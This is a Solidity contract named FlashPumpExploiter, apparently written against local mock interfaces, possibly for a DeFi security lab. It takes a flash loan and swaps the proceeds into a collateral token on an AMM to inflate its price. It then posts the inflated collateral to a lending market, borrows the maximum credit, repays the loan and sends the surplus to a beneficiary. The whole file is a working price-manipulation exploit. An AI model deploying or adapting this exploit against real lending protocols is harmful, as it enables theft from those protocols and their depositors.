// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC20} from "./interfaces/IERC20.sol";
import {IConstantProductPool} from "./interfaces/ISimpleAMM.sol";
import {IFlashLoanCallback} from "./interfaces/IFlashBorrower.sol";
import {ICreditMarket} from "./interfaces/ILendingPool.sol";
import {AtomicFlashVault} from "./FlashLoanPool.sol";

contract FlashPumpExploiter is IFlashLoanCallback {
    IERC20 public immutable stableToken;
    IERC20 public immutable collateralToken;
    IConstantProductPool public immutable ammPool;
    ICreditMarket public immutable creditMarket;
    AtomicFlashVault public immutable flashVault;
    address public immutable beneficiary;

    uint256 public drawnAgainstCollateral;
    uint256 public postedCollateral;
    uint256 public settledFlashTotal;

    constructor(
        address stableToken_,
        address collateralToken_,
        address ammPool_,
        address creditMarket_,
        address flashVault_,
        address beneficiary_
    ) {
        stableToken = IERC20(stableToken_);
        collateralToken = IERC20(collateralToken_);
        ammPool = IConstantProductPool(ammPool_);
        creditMarket = ICreditMarket(creditMarket_);
        flashVault = AtomicFlashVault(flashVault_);
        beneficiary = beneficiary_;
    }

    function executeExploit(uint256 flashPrincipal) external {
        flashVault.requestFlashLoan(address(this), flashPrincipal, "");
    }

    function executeOperation(
        address,
        address,
        uint256 principal,
        uint256 feeAmount,
        bytes calldata
    ) external returns (bytes32) {
        require(msg.sender == address(flashVault), "UNAUTHORIZED_FLASH_CALLER");

        stableToken.approve(address(ammPool), principal);
        uint256 acquiredCollateral =
            ammPool.swapExactIn(principal, 0, address(stableToken), address(this));

        collateralToken.approve(address(creditMarket), acquiredCollateral);
        creditMarket.supplyCollateral(acquiredCollateral);
        postedCollateral = acquiredCollateral;

        uint256 maxCredit = creditMarket.availableCredit(address(this));
        creditMarket.drawDebt(maxCredit);
        drawnAgainstCollateral = maxCredit;

        uint256 totalRepayment = principal + feeAmount;
        stableToken.approve(address(flashVault), totalRepayment);
        settledFlashTotal = totalRepayment;

        uint256 currentStableBalance = stableToken.balanceOf(address(this));
        uint256 netSurplus = currentStableBalance > totalRepayment ? currentStableBalance - totalRepayment : 0;
        if (netSurplus > 0) {
            stableToken.transfer(beneficiary, netSurplus);
        }

        return keccak256("IFlashLoanCallback.executeOperation");
    }
}
